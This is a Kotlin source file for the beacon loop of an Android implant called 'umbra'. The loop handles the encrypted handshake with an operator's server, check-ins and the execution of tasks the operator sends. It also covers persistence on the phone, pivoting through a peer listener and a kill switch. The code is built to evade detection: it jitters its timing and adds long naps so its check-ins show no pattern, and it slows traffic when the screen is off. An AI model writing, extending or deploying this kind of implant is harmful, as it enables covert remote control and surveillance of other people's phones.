package io.umbra.beacon

import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

/**
 * Beacon loop: handshake, check-in, task execution, jittered sleep.
 *
 * Runs on its own thread; [BeaconService] owns the wake lock and foreground
 * notification so Android does not suspend the loop.
 */
class Beacon(
    private val config: BeaconConfig,
    private val listener: Listener? = null,
) {
    interface Listener {
        fun onLog(message: String)
        fun onStopped()
    }

    private val running = AtomicBoolean(false)
    private val lifecycle = Any()
    private var thread: Thread? = null

    // Owned by the beacon thread; @Volatile so stop() can abort a blocked read.
    @Volatile private var session: Session? = null
    @Volatile private var channel: Channel? = null

    private var sleep = config.sleepSec.toLong()
    private var jitter = config.jitterPercent

    /** When the implant started: the heartbeat carries the uptime. */
    private val startedAt = System.currentTimeMillis()

    /** Sleep obfuscation: an occasional long nap hides the metronome. */
    private var sleepObfuscate = true
    private var failures = 0

    /** The state of the evasion engine: the schedule and the kill switch. */
    private var evasion = Evasion.load(config.stateDir)

    /**
     * The address of the peer listener, once it is bound.
     *
     * It travels in the handshake: the server resolves the chain of a
     * pivot from it.
     */
    @Volatile private var peerAddress: String = ""

    /**
     * The route the server pushed: the transport the phone speaks and the
     * order it may fall back in.
     */
    @Volatile private var route: Route? = null

    /**
     * Start the loop. Refuses if a thread still exists: two live loops would
     * share one session and violate the SEND-SERIAL invariant (frames must
     * leave in nonce order), so a restart waits for [stop] to have joined.
     */
    fun start() {
        synchronized(lifecycle) {
            if (running.get() || thread != null) return
            running.set(true)
            startPeerListener()
            // The pivot callback needs the server address and the agent key.
            TaskRunner.configure(
                TaskRunner.Context(
                    host = config.host,
                    port = config.port,
                    psk = config.psk,
                    agentId = config.agentId,
                    version = config.version,
                    log = { message -> log(message) },
                    stateDir = config.stateDir,
                    android = config.androidContext,
                )
            )
            val t = Thread({ loop() }, "umbra-beacon")
            t.isDaemon = true
            thread = t
            t.start()
        }
    }

    /** Stop the loop, close the transport and wait for the thread to exit. */
    fun stop() {
        val t: Thread?
        synchronized(lifecycle) {
            running.set(false)
            t = thread
            thread = null
            channel?.close()
        }
        // The loop may be asleep: the signal ends the wait at once.
        synchronized(signal) {
            signal.notifyAll()
        }
        if (t != null && t !== Thread.currentThread()) {
            try {
                t.join(STOP_JOIN_MILLIS)
            } catch (_: InterruptedException) {
                // Propagate the interrupt only after the channel is closed.
            }
        }
    }

    fun isRunning(): Boolean = running.get()

    /**
     * The signal that asks the loop to connect again right now.
     *
     * The watchers of the phone use it: a message that arrives at three
     * in the morning does not wait for the end of the sleep.
     */
    private val signal = Object()

    /** Whether somebody asked for an early connect. */
    private var wakeRequested = false

    /**
     * Connect again as soon as possible.
     *
     * The call is safe from any thread: the loop wakes up, does a cycle
     * and goes back to sleep.
     */
    fun wake() {
        synchronized(signal) {
            wakeRequested = true
            signal.notifyAll()
        }
    }

    /**
     * Wait for the interval, or until somebody asks for an early connect.
     *
     * The wait is on a monitor and not on a sleep, so the request of the
     * watcher ends it at once.
     */
    private fun nap(intervalSeconds: Long) {
        val until = System.currentTimeMillis() + intervalSeconds * 1000
        synchronized(signal) {
            while (!wakeRequested && running.get()) {
                val left = until - System.currentTimeMillis()
                if (left <= 0) break
                try {
                    signal.wait(left)
                } catch (_: InterruptedException) {
                    return
                }
            }
            wakeRequested = false
        }
    }

    private fun log(msg: String) {
        listener?.onLog(msg)
    }

    private companion object {
        const val STOP_JOIN_MILLIS = 2000L

        /** Control frames (REKEY) tolerated before a TASK_BATCH. */
        // One REKEY plus up to four TASK_CANCEL frames may precede the batch.
        const val MAX_CONTROL_FRAMES = 8

    }

    private fun loop() {
        while (running.get()) {
            try {
                // The state of the engine is read again every cycle: the
                // operator may have armed the kill switch since the last
                // check-in.
                evasion = Evasion.load(config.stateDir)
                val reason = Evasion.killSwitch(evasion)
                if (reason != null) {
                    log("the kill switch fired: $reason")
                    running.set(false)
                    break
                }
                if (cycle()) {
                    sleep = sleep.coerceIn(1, 86400)
                    val interval = nextIntervalSeconds()
                    log("beacon sleeping ${interval}s")
                    nap(interval)
                }
            } catch (e: InterruptedException) {
                break
            } catch (t: Throwable) {
                failures += 1
                log("cycle failed (${failures}): ${t.message}")
                try {
                    Thread.sleep(backoffSeconds() * 1000)
                } catch (i: InterruptedException) {
                    break
                }
            }
        }
        synchronized(lifecycle) {
            running.set(false)
            thread = null
        }
        listener?.onStopped()
    }

    /** Exponential backoff, capped at 5 doublings (max 5 min). */
    private fun backoffSeconds(): Long = (sleep * (1L shl (failures.coerceAtMost(5)))).coerceAtMost(300)

    /**
     * Sleep interval with jitter and obfuscation.
     *
     * The jitter spreads the check-ins around the configured interval: uniform
     * in [sleep*(1-j), sleep*(1+j)].  The obfuscation adds an occasional long
     * nap on top of it, because a perfectly uniform distribution is a
     * signature of its own.
     */
    private fun nextIntervalSeconds(): Long {
        // The schedule of the day stretches the interval: the phone is busy
        // while the office is open and quiet at night.
        val factor = (Evasion.factor(evasion) * screenFactor()).coerceAtLeast(0.1)
        val base = sleep.toDouble() * factor
        val j = jitter.coerceIn(0, 90) / 100.0
        val lo = (base * (1.0 - j)).coerceAtLeast(1.0)
        val hi = (base * (1.0 + j)).coerceAtLeast(lo)
        var interval = (lo + (hi - lo) * Random.nextDouble()).toLong()
        if (sleepObfuscate && Random.nextDouble() < 0.25) {
            // One check-in in four takes a long nap: 1.5 to 3.5 times the
            // jittered interval.
            interval = (interval * (1.5 + 2.0 * Random.nextDouble())).toLong()
        }
        return interval.coerceAtLeast(1)
    }

    /**
     * The factor the interval gets when nobody is looking at the phone.
     *
     * A phone whose screen is off is a phone that is lying on a table:
     * the check-in stretches, so the traffic of the night is sparse and
     * the battery lasts longer.  The screen of a phone is the closest
     * thing it has to the presence of a person in front of it.
     */
    private fun screenFactor(): Double {
        val ctx = config.androidContext ?: return 1.0
        return try {
            val power = ctx.getSystemService(android.content.Context.POWER_SERVICE)
                as? android.os.PowerManager
            if (power != null && !power.isInteractive) 2.5 else 1.0
        } catch (t: Throwable) {
            1.0
        }
    }

    /** One full beacon cycle. Returns false when the server told us to exit. */
    private fun cycle(): Boolean {
        openChannel()
        handshake()
        return checkin()
    }

    private fun openChannel() {
        channel?.close()
        // The route of the server decides which transport is tried first
        // and which ones come after it.
        val wanted = route?.transports(config.transport.lowercase())
            ?: listOf(config.transport.lowercase())
        var last: Throwable? = null
        for (name in wanted) {
            try {
                channel = when (name) {
                    "http" -> HttpChannel(config.httpBaseUrl, config.httpPath)
                    "tcp" -> TcpChannel(config.host, config.port).also {
                        it.connect()
                        log("tcp connected ${Addr.hostPort(config.host, config.port)}")
                    }
                    else -> {
                        // A transport the phone cannot speak: the route
                        // falls back to the next one.
                        log("the route names the transport $name, which this beacon does not speak")
                        continue
                    }
                }
                return
            } catch (t: Throwable) {
                last = t
            }
        }
        throw last ?: TransportException("no transport could be opened")
    }

    /**
     * The metadata of the handshake: the host facts and where the peer
     * listener waits.
     */
    /** How long the implant has been running, in seconds. */
    private fun uptimeSeconds(): Long = (System.currentTimeMillis() - startedAt) / 1000

    private fun meta(): Upk.MapV {
        val meta = SysInfo.meta(config.version)
        val address = peerAddress
        if (address.isNotEmpty()) {
            meta.entries["p2p"] = Upk.str(address)
        }
        return meta
    }

    /**
     * Bind the peer listener and serve the pivots that are chained
     * through this host.
     *
     * The listener is bound before the first handshake, so the address is
     * known when the server learns about the beacon.
     */
    private fun startPeerListener() {
        if (config.peerListen.isEmpty()) return
        try {
            peerAddress = Peer.listenPeer(
                config.peerListen, config.psk, config.agentId,
            ) { message -> log(message) }
        } catch (t: Throwable) {
            log("the peer listener could not bind: ${t.message}")
        }
    }

    /**
     * Apply the route the server pushed.
     *
     * The route is the road the beacon has to take: the operator knows the
     * network of the target, the beacon does not.  A transport the phone
     * cannot speak is ignored.
     */
    private fun applyRoute(value: Upk?) {
        if (value == null) return
        val primary = value.field("primary")?.text() ?: ""
        if (primary.isEmpty()) return
        val fallback = (value.field("fallback")?.list() ?: emptyList())
            .mapNotNull { it.text() }
            .filter { it.isNotEmpty() }
        route = Route(
            primary = primary.lowercase(),
            fallback = fallback.map { it.lowercase() },
            front = value.field("front")?.text() ?: "",
            inspect = value.field("inspect")?.flag() ?: false,
        )
        log("the route is now ${route!!.primary} (fallback: ${route!!.fallback.joinToString(", ")})")
    }

    private fun handshake() {
        val suite = Wire.SUITE_AES256_GCM
        val ephemeral = Crypto.x25519Keypair()
        val clientNonce = Crypto.random(16)
        val ts = System.currentTimeMillis() / 1000
        val auth = Crypto.helloAuth(
            config.psk, Crypto.ROLE_AGENT, config.agentId.toByteArray(),
            ephemeral.publicRaw, clientNonce, ts, suite,
        )
        val hello = Upk.map(
            "v" to Upk.num(Wire.HELLO_VERSION.toLong()),
            "role" to Upk.num(Crypto.ROLE_AGENT.toLong()),
            "id" to Upk.str(config.agentId),
            "pub" to Upk.bin(ephemeral.publicRaw),
            "cn" to Upk.bin(clientNonce),
            "ts" to Upk.num(ts),
            "suite" to Upk.num(suite.toLong()),
            "auth" to Upk.bin(auth),
            "meta" to meta(),
            // The capability list is a field of its own in the second
            // version of the handshake: the server reads it before it
            // looks at the metadata and refuses work the phone cannot do.
            "caps" to Upk.Arr(TaskRunner.CAPABILITIES.map { Upk.str(it) }),
            // The version of the implant and the module ABI it speaks.
            "iver" to Upk.str(config.version),
            "abi" to Upk.num(Wire.ABI_VERSION.toLong()),
            // The platform details: the os, the architecture and the family.
            "plat" to Upk.map(
                "os" to Upk.str("android"),
                "arch" to Upk.str(SysInfo.machine()),
                "family" to Upk.str("android"),
            ),
        )
        val boot = Session.fromBootstrap(config.psk, suite, isServer = false)
        val frame = boot.sealValue(Wire.MSG_HELLO, hello)
        val ch = channel ?: throw TransportException("no channel")
        ch.writeFrame(frame)

        val (msgType, ack) = boot.openValue(ch.readFrame())
        if (msgType != Wire.MSG_HELLO_ACK) throw SessionException("expected HELLO_ACK")
        val serverPub = ack.field("pub")?.bytes() ?: throw SessionException("missing server key")
        val serverNonce = ack.field("sn")?.bytes() ?: throw SessionException("missing nonce")
        val sid = ack.field("sid")?.bytes() ?: throw SessionException("missing session id")
        val negSuite = ack.field("suite")?.long()?.toInt() ?: 0
        if (serverPub.size != 32 || serverNonce.size != 16 || sid.size != 16) {
            throw SessionException("malformed HELLO_ACK")
        }
        val want = Crypto.ackAuth(
            config.psk, config.agentId.toByteArray(), ephemeral.publicRaw,
            serverPub, clientNonce, serverNonce, sid, negSuite,
        )
        if (!Crypto.ctEq(want, ack.field("auth")?.bytes())) {
            throw SessionException("server authentication failed (wrong PSK?)")
        }
        val shared = Crypto.x25519Shared(ephemeral.privateKey, serverPub)
        val (prk, km) = Crypto.deriveSession(shared, clientNonce, serverNonce)
        session = Session(negSuite, isServer = false, bootstrap = false, material = km, prk = prk)
        ch.setSessionId(Crypto.hex(sid))

        ack.field("cfg")?.let { cfg ->
            cfg.field("sleep")?.long()?.let { sleep = it.coerceAtLeast(1) }
            cfg.field("jitter")?.long()?.let { jitter = it.toInt() }
            // The server decides whether the check-in pattern is hidden.
            cfg.field("obf")?.flag()?.let { sleepObfuscate = it }
        }
        log("handshake complete (suite=$negSuite)")
    }

    private fun checkin(): Boolean {
        val sess = session ?: throw SessionException("no session")
        val ch = channel ?: throw TransportException("no channel")
        val ts = System.currentTimeMillis() / 1000
        ch.writeFrame(sess.sealValue(Wire.MSG_CHECKIN, Upk.map("ts" to Upk.num(ts), "n" to Upk.num(0))))

        // The server may rotate keys immediately before the batch. A REKEY
        // frame is sealed with the OLD key set and is always followed by
        // TASK_BATCH, so read until the batch arrives (bounded) instead of
        // guessing a frame count.
        var batch: Upk? = null
        val cancelled = HashSet<String>()
        var rounds = 0
        while (true) {
            rounds += 1
            if (rounds > MAX_CONTROL_FRAMES) throw SessionException("too many control frames")
            val (msgType, body) = sess.openValue(ch.readFrame())
            when (msgType) {
                Wire.MSG_REKEY -> {
                    val seed = body.field("seed")?.bytes()
                    if (seed == null || seed.size != 32) throw SessionException("malformed REKEY seed")
                    sess.applyRekey(seed)
                    log("session rekeyed")
                }
                Wire.MSG_TASK_CANCEL -> {
                    // The operator cancelled a task this beacon already holds.
                    // Remember it and keep reading: the batch that follows says
                    // what to run, and the cancelled ids are skipped there.
                    val id = body.field("id")?.text() ?: ""
                    if (id.isEmpty()) throw SessionException("TASK_CANCEL without a task id")
                    cancelled.add(id)
                    log("task $id cancelled by operator")
                }
                Wire.MSG_TASK_BATCH -> {
                    batch = body
                    break
                }
                Wire.MSG_KILL -> {
                    log("server sent KILL")
                    bye()
                    return false
                }
                else -> throw SessionException("expected TASK_BATCH, got ${msgType.toInt()}")
            }
        }

        val batchBody = batch ?: throw SessionException("no TASK_BATCH received")
        // Server-side policy wins over the compiled-in cadence.
        batchBody.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
        batchBody.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
        batchBody.field("obf")?.flag()?.let { sleepObfuscate = it }
        // The route of the agent travels with the batch: the beacon learns
        // which transport it speaks and in which order it may fall back.
        applyRoute(batchBody.field("route"))
        val tasks = batchBody.field("tasks")?.list() ?: emptyList()
        // The heartbeat: the small frame that says "still here, this is
        // what I am".  It is sent after the batch, because a frame that
        // is sent between the check-in and the batch would be sealed with
        // the old keys when the server has already switched.
        ch.writeFrame(
            sess.sealValue(
                Wire.MSG_HEARTBEAT,
                Upk.map(
                    "v" to Upk.num(1),
                    "iver" to Upk.str(config.version),
                    "abi" to Upk.num(Wire.ABI_VERSION.toLong()),
                    "busy" to Upk.num(tasks.size.toLong()),
                    "up" to Upk.num(uptimeSeconds()),
                ),
            )
        )
        for (task in tasks) {
            val id = task.field("id")?.text() ?: ""
            val kind = task.field("kind")?.text() ?: ""
            val args = task.field("args") ?: Upk.map()
            if (id in cancelled) {
                // Still report: the server keeps the cancelled state and stores
                // the output, so the operator can see that nothing ran.
                log("task $id skipped (cancelled)")
                ch.writeFrame(
                    sess.sealValue(
                        Wire.MSG_RESULT,
                        TaskRunner.Outcome(125, ByteArray(0), "cancelled before execution").toValue(id),
                    )
                )
                continue
            }
            log("task $id kind=$kind")
            // The marker of the kill switch: the operator sends it and the
            // implant stops existing.
            if (Evasion.markerFired(evasion, args)) {
                ch.writeFrame(
                    sess.sealValue(
                        Wire.MSG_RESULT,
                        TaskRunner.Outcome(0, ByteArray(0), "the kill switch fired").toValue(id),
                    )
                )
                bye()
                running.set(false)
                return false
            }
            when (kind) {
                "exit", "kill" -> {
                    // The exit takes the persistence entries with it: the
                    // empty record travels with the result, so the server
                    // does not keep a lie after the engagement.
                    val outcome = TaskRunner.run(kind, args)
                        .with("persist", Upk.Arr(emptyList()))
                        .with("persist_total", Upk.num(0))
                        .with("persist_broken", Upk.num(0))
                    answer(ch, sess, id, outcome)
                    bye()
                    // The exit is the last word of the operator: the
                    // implant takes its persistence entries with it, so the
                    // phone is left the way it was found.  This is also the
                    // path the panic task of the server takes.
                    TaskRunner.removePersistence()
                    running.set(false)
                    return false
                }
                "sleep" -> {
                    args.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
                    args.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
                    answer(ch, sess, id, TaskRunner.run("sleep", args))
                }
                else -> {
                    answer(ch, sess, id, TaskRunner.run(kind, args))
                }
            }
        }
        bye()
        failures = 0
        return true
    }

    /**
     * The answer of a task.
     *
     * A streamed answer travels in pieces: every chunk is a partial
     * result -- the task stays open while the pieces travel -- and the
     * final result closes it.  The answer of a task that does not stream
     * is a single frame, exactly as before.
     */
    private fun answer(ch: Channel, sess: Session, id: String, outcome: TaskRunner.Outcome) {
        for (chunk in outcome.chunks) {
            ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.partialValue(id, chunk)))
        }
        ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.toValue(id)))
    }

    private fun bye() {
        try {
            val sess = session
            val ch = channel
            if (sess != null && ch != null) {
                ch.writeFrame(sess.sealValue(Wire.MSG_BYE, Upk.map()))
                ch.flush()
            }
        } catch (_: Throwable) {
        } finally {
            channel?.close()
            session = null
        }
    }
}

/** Build-time configuration, injected by Gradle from the environment. */
data class BeaconConfig(
    val host: String,
    val port: Int,
    val psk: ByteArray,
    val agentId: String,
    val transport: String,
    val httpBaseUrl: String,
    val httpPath: String,
    val sleepSec: Int,
    val jitterPercent: Int,
    val version: String,
    /**
     * The Android context of the implant.
     *
     * The persistence manager needs it: the boot receiver, the sticky
     * service and the alarm are all things the package manager knows
     * about, and only the context can change them.
     */
    val androidContext: android.content.Context? = null,
    /**
     * Where the implant keeps its own state.
     *
     * The persistence entries live there, so the operator can ask the
     * phone what is installed on it long after the fact.
     */
    val stateDir: String = "",
    /**
     * The address of the peer listener ("" = no peer link).
     *
     * The beacon binds it, tells the server where it waits, and serves the
     * pivots that are chained through this host.
     */
    val peerListen: String = "",
)
